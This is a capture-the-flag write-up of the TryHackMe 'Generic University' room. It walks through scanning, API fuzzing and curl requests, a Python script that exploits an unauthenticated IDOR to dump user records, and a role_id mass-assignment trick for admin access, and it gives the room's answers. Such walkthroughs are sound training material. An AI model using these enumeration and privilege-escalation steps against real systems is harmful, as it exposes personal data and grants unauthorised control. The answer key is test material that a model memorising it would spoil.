# Generic University

## Introduction

Welcome to my another writeup! In this TryHackMe [Generic University](https://tryhackme.com/room/genericuniversity) room, you'll learn: API fuzzing, IDOR (Insecure Direct Object Reference) and more! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Table of Content

1. **[Task 1 - Enroll today in Generic University](#task-1---enroll-today-in-generic-university)**
2. **[Task 2 - Basic Recon](#task-2---basic-recon)**
3. **[Task 3 - Get an account](#task-3---get-an-account)**
4. **[Task 4 - Becoming an admin](#task-4---becoming-an-admin)**
5. **[Task 5 - Admin Panels](#task-5---admin-panels)**
6. **[Conclusion](#conclusion)**

## Background

> API and Web testing room
>  
> Difficulty: Medium

---

## Task 1 - Enroll today in Generic University

Generic University is an old, prestigious university with a long history dating back to 1066 where it was initially a training program for sheep dogs. Now it's a modern university with an old look. Our classes are very difficult and we aim to stress students out, very few of them pass their courses, but a grade higher than 90% is unheard of in our history. As the motto says "Inflict Pain"

---

### Question 1 - What is the Generic University motto?

In the web application's home page, we see this image:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230225131834.png)

- **Answer: `LOREM IPSUM`**

## Task 2 - Basic Recon

The API is currently in development and many of the API endpoints aren't publically accessible, use basic recon to find these hidden endpoints. Bare in mind this is a RESTful API.

---

### Question 1 - What API endpoint may allow someone to edit a grade?

As usual, scan the machine for open ports via `rustscan`!

**Rustscan:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.21|20:34:38(HKT)]
└> export RHOSTS=10.10.15.101                             
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.21|20:34:44(HKT)]
└> rustscan --ulimit 5000 -b 4500 -t 2000 --range 1-65535 $RHOSTS -- -sC -sV -oN rustscan/rustscan.txt
[...]
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 70121d390ed67fc141b548eb0b2edd09 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCoHAMCthJ4cP3O4erJuzYHPuzoQ9LOXObM/o5CQC3y5X/OcuTtAv2fujHQmn4odx9o5kUhB86cSXbykcwEPwFSxEYaYJ7ik+eQGt5idB3aUNBKkrl4nD8r6mdO2WQAxrrG9+9DVfN1XEAA/5g0rYlg9JdNlWFaaIKJOswF0dVBr+MGJr1Lre8fWI+t+f9piJYBkBh1N4FVnnYpP5W+PBqfYZ2XXT3u7x3Rt/SHFGXXXFQFcdDU1q5LSZuK/fvkrZS6uSQG0q+k3l/NKOa+m4nfw1IoxZXdztSbv4zKYJaCt8ICdtuOZuYjSlpGTeXvh3yvRNE3VVO3ZDa830ljic51
|   256 1bcd140ff67da0340dc07e3dff3458bc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEWW7wBgUUGJbtH8Nkovb7w5U6+Kfqzq6B1Ln1+TKfyfyVDOr1aXAHxfKwquqE/eElaXWdoNrT3VfCgkVT+wfqk=
|   256 b6732ab30c7e4dd4eb192f9cf79047e1 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJjrAQrvcGMb/vv+0Z5glOipNR+h1cSHZw7R2ZP2nc8P
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
|_http-title: Generic University - View your Grades
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

According to `rustscan` result, we have 2 ports are opened:

|Open Port         | Service                       |
|:---:             |:---:                          |
|22                | OpenSSH 7.6p1 Ubuntu          |
|80                | Apache httpd 2.4.29 ((Ubuntu))|

#### HTTP on Port 80

**Adding a new host to `/etc/hosts`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.21|20:45:00(HKT)]
└> echo "$RHOSTS generic-university.thm" | sudo tee -a /etc/hosts
```

**robots.txt:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.21|20:52:41(HKT)]
└> curl -v http://generic-university.thm/robots.txt
*   Trying 10.10.15.101:80...
* Connected to generic-university.thm (10.10.15.101) port 80 (#0)
> GET /robots.txt HTTP/1.1
> Host: generic-university.thm
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Tue, 21 Feb 2023 12:56:17 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Last-Modified: Wed, 06 Apr 2022 09:24:24 GMT
< ETag: "18-5dbf8ed644ecd"
< Accept-Ranges: bytes
< Content-Length: 24
< Content-Type: text/plain
< 
User-agent: *
Disallow:
```

Nothing weird in `robots.txt`.

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230221204849.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230221204918.png)

In here, we can see that **there are 3 pages: "Login", "Contact IT", and "Report a Security Vulnerability".**

**Now, we can use `gobuster` to enumerate hidden directories and files:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.21|21:34:13(HKT)]
└> gobuster dir -u http://generic-university.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 10
[...]
/images               (Status: 301) [Size: 333] [--> http://generic-university.thm/images/]
/admin                (Status: 200) [Size: 127]
/contact              (Status: 200) [Size: 4542]
/login                (Status: 200) [Size: 5725]
/register             (Status: 200) [Size: 5782]
/logout               (Status: 405) [Size: 558321]
/home                 (Status: 200) [Size: 3664]
```

**/admin:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.22|13:23:39(HKT)]
└> curl http://generic-university.thm/admin 
<p>Welcome to the admin dashboard</p><p><a href="http://generic-university.thm/admin/security">Security Vulnerabilities</a></p>
```

Nothing weird in `/admin`?

**/register:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230222133132.png)

It seems like we can register an account.

**After that, we can also fuzz API endpoints via `gobuster`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.22|13:33:40(HKT)]
└> gobuster dir -u http://generic-university.thm/api/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 10
[...]
/admin                (Status: 302) [Size: 386] [--> http://generic-university.thm/login]
/user                 (Status: 302) [Size: 386] [--> http://generic-university.thm/login]
/classes              (Status: 200) [Size: 955]
/users                (Status: 200) [Size: 1302]
```

**Since RESTful API endpoints can also accept PUT, DELETE, and other HTTP methods, we can use `ffuf` to fuzz those endpoints:**
```shell
┌[siunam♥earth]-(~/ctf/VU-Cyberthon-2023)-[2023.02.25|13:31:23(HKT)]
└> ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -u http://generic-university.thm/api/FUZZ -t 10 -timeout 30 -X PUT
[...]
```

Now, the API endpoint to edit a grade should be `/api/grade` with PUT method.

**However, when I reach there:**
```shell
┌[siunam♥earth]-(~/ctf/VU-Cyberthon-2023)-[2023.02.25|13:36:13(HKT)]
└> curl -X PUT http://generic-university.thm/api/grade 
[...]
        <div class="flex-center position-ref full-height">
            <div class="code">
                404            </div>

            <div class="message" style="padding: 10px;">
                Not Found            </div>
[...]
```

404 Not Found... No idea why.

- **Answer: `PUT /api/grade`**

### Question 2 - What API endpoint shows all individuals holding accounts?

**View source page:**
```html
    [...]
    <script>
        $.ajax({
            url: "http://generic-university.thm/api/users/6",
            type: 'GET',
            dataType: 'json',
            success: function (json) {
                console.log(json);
                $( "#creator" ).text(json['name']);
            }
        });
    </script>
    [...]
```

As you can see, there is an API endpoint: `/api/<route>`, and **we found one of those endpoint: `/api/users/<user_id?>`**

Let's try to GET that user. **If there is no authentication and the user ID is incremented by 1, we can basically enumeration all users! And it's vulnerable to IDOR (Insecure Direct Object Referenece).**

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.21|20:57:19(HKT)]
└> curl -v http://generic-university.thm/api/users/6
*   Trying 10.10.15.101:80...
* Connected to generic-university.thm (10.10.15.101) port 80 (#0)
> GET /api/users/6 HTTP/1.1
> Host: generic-university.thm
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Tue, 21 Feb 2023 12:57:21 GMT
< Server: Apache/2.4.29 (Ubuntu)
< Cache-Control: no-cache, private
< Set-Cookie: XSRF-TOKEN=eyJpdiI6Im0xTEpQNzdFTXF5QlM1elZnV3hnVUE9PSIsInZhbHVlIjoiaWU5RjRHVjBPblJ6WEdkZnplQlUxeHFaWWdDc29VMDg2ZDJiemxnMGFqK08yRzRCdGRUU2lvbWtEYkZpTjdUQW8rOTEyQXpOOGFsYWovQzFoZ0kyeC9lNTFNUUZzcGVhQURMN0ZmV0w1dVZvcENSckN2VStCbGMza1M2TjJjRWoiLCJtYWMiOiIxYzM0YTMyYTI0ODUyMWIwNmM1NWU4ZjQzMWNjNjQ5N2U1Y2RlNWNjYTViNDE2N2Y1MmRmOTQwZmM2OGRjNzE1In0%3D; expires=Tue, 21-Feb-2023 14:57:21 GMT; Max-Age=7200; path=/; samesite=lax
< Set-Cookie: laravel_session=eyJpdiI6InRQRFlxMjg2d2ZBcm9mREcyMUU5WWc9PSIsInZhbHVlIjoiekxQTXBDN2REMURFZnR3UWE0Nkk5Q0ZnUkdXdVhpY0JrMWlVSXJmbk13Z0Z4c0RMcXFaRHc1YjJzN1dTc3FJRWZUNDZ2MWtCVGIyT1VuZ2RMSGY2ZXRodi9KalhPWmtFVlBYRjczQ01NWnI3OVdiOFp2cmplUXJyZzBiNU1xQ2wiLCJtYWMiOiIzMTkyYTc3YzdhMjBlNmE0MzYwNzRkOTAxZGJjY2NiNGQzZTFmYmVkNWE2N2ZmYTkxNGZjZGUxMGRjNTJmMGE3In0%3D; expires=Tue, 21-Feb-2023 14:57:21 GMT; Max-Age=7200; path=/; httponly; samesite=lax
< Content-Length: 190
< Content-Type: application/json
< 
* Connection #0 to host generic-university.thm left intact
{"id":6,"name":"IT Nicola Langworth","email":"laura97@douglas.net","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":1}
```

We can reach that endpoint **without authentication**!

That being said, we can enumerate all users in this web application!

Also, when we reach the website, it'll set 2 new cookies: `XSRF-TOKEN` and `laravel_session`. Which indicates that **this web application is using a PHP framework called Laravel**.

**Let's write a simple Python script to automate the enumeration!**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

class Requester:
    def __init__(self, URL, apiEndpoint):
        self.URL = URL
        self.apiEndpoint = apiEndpoint

    def sendRequest(self, userId):
        userAPIRequestResult = requests.get(self.URL + self.apiEndpoint + str(userId))

        if "{'not found':true}" not in userAPIRequestResult.text:
            print(f'[+] Found valid user ID: {userId}')
            print(f'[+] user ID {userId} data: {userAPIRequestResult.text}')

def main():
    URL = 'http://generic-university.thm'
    apiEndpoint = '/api/users/'

    requester = Requester(URL, apiEndpoint)
    for userId in range(100):
        print(f'[*] Trying user ID: {userId}', end='\r')
        thread = Thread(target=requester.sendRequest, args=(userId,))
        thread.start()
        sleep(0.3)

if __name__ == '__main__':
    main()
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.21|21:26:10(HKT)]
└> python3 api_users_enumeration.py
[+] Found valid user ID: 2
[+] user ID 2 data: {"id":2,"name":"Barbara Bauch","email":"pabshire@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}
[+] Found valid user ID: 1
[+] user ID 1 data: {"id":1,"name":"Javon Moen","email":"johnathon71@rolfson.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}
[+] Found valid user ID: 5
[+] user ID 5 data: {"id":5,"name":"Taya Kohler","email":"hspinka@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}
[+] Found valid user ID: 4
[+] user ID 4 data: {"id":4,"name":"Jalon Fisher","email":"tmiller@hotmail.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}
[+] Found valid user ID: 3
[+] user ID 3 data: {"id":3,"name":"Muriel Mante","email":"jgerlach@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2}
[+] Found valid user ID: 6
[+] user ID 6 data: {"id":6,"name":"IT Nicola Langworth","email":"laura97@douglas.net","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":1}
[+] Found valid user ID: 7
[+] user ID 7 data: {"id":7,"name":"Dr Judge Klein","email":"milo.goyette@medhurst.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":3}
```

We successfully enumerated all users!

> Note: We can also use the API endpoint `/api/users` to list all users.

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.22|13:32:53(HKT)]
└> curl http://generic-university.thm/api/users  
[{"id":1,"name":"Javon Moen","email":"johnathon71@rolfson.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":2,"name":"Barbara Bauch","email":"pabshire@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":3,"name":"Muriel Mante","email":"jgerlach@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":4,"name":"Jalon Fisher","email":"tmiller@hotmail.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":5,"name":"Taya Kohler","email":"hspinka@yahoo.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":2},{"id":6,"name":"IT Nicola Langworth","email":"laura97@douglas.net","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":1},{"id":7,"name":"Dr Judge Klein","email":"milo.goyette@medhurst.com","email_verified_at":null,"created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","role_id":3}]
```

Although we don't see any password, we can still see some juice information: `name`, `email`, `role_id`.

- **Answer: `GET /api/users`**

### Question 3 - What API endpoint shows all the possible courses on Generic University?

**In question 1 `gobuster`'s result, we found there's a `/api/classes` endpoint:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.22|13:33:06(HKT)]
└> curl http://generic-university.thm/api/classes
[{"id":1,"name":"Dynamics","description":"morph web-enabled supply-chains","created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","user_id":7},{"id":2,"name":"Aerospace Propulsion Systems","description":"enhance collaborative supply-chains","created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","user_id":7},{"id":3,"name":"Theory and Applications of Turbulence","description":"recontextualize interactive portals","created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","user_id":7},{"id":4,"name":"Aerospace Propulsion Systems","description":"disintermediate open-source architectures","created_at":"2022-04-06T09:34:55.000000Z","updated_at":"2022-04-06T09:34:55.000000Z","user_id":7},{"id":5,"name":"Fluid Mechanics","description":"transform viral interfaces","created_at":"2022-04-06T09:34:56.000000Z","updated_at":"2022-04-06T09:34:56.000000Z","user_id":7}]
```

This endpoint will shows all the courses on Generic University!

- **Answer: `GET /api/classes`**

## Task 3 - Get an account

Now we have done some basic recon, we will need an account for further testing, can you register an account?

---

### Question 1 - What endpoint lets you create an account?

**In question 1 `gobuster`'s result, we found that there's a `/register` endpoint:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Generic-University)-[2023.02.21|21:34:13(HKT)]
└> gobuster dir -u http://generic-university.thm/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -t 10
[...]
/register             (Status: 200) [Size: 5782]
```

Which allows us to register an account.

- **Answer: `GET /register/`**

### Question 2 - What other endpoint lets you create an account?

**After some trial and error, I found that we can create an account in `/api/users` via POST method:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230226120508.png)

As you can see, it's trying to add a new user via a SQL INSERT statement.

However, it returns an error because **we didn't supply the `name` parameter**.

Let's supply the parameter!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230226120655.png)

This time we don't have the `email` parameter:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230226120732.png)

Missing `password` parameter:

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230226120759.png)

Nice! We can create a new user!

**Also, there's a `role_id` property. Can we control that??**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Generic-University/images/Pasted%20image%2020230226120924.png)

We can!!

That being said, we can create any account with any `role_id`. Maybe we can do privilege escalate later on.

### Question 3 - Why doesn't this work?

- **Answer: `reset password`**

## Task 4 - Becoming an admin

*Hacker Noises*, we're in, but what next?

---

### Question 1 - What is the role ID for the Admin role?

- **Answer: `1`**

### Question 2 - What HTTP request method allows you to change a user?

- **Answer: `PUT`**

## Task 5 - Admin Panels

### Question 1  - What is the path of the first admin panel (security vulnerabilities)?

- **Answer: `/admin/`**

### Question 2 - What is the path of the second admin panel (delete and restore)?

- **Answer: `/api/admin`**

### Question 3 - What is the request that deletes all the data format: [HTTP method] [path]

- **Answer: `GET /api/admin/delete`**

# Conclusion

What we've learned:

1. Content Discovery
2. API Fuzzing
3. IDOR (Insecure Direct Object Referenece)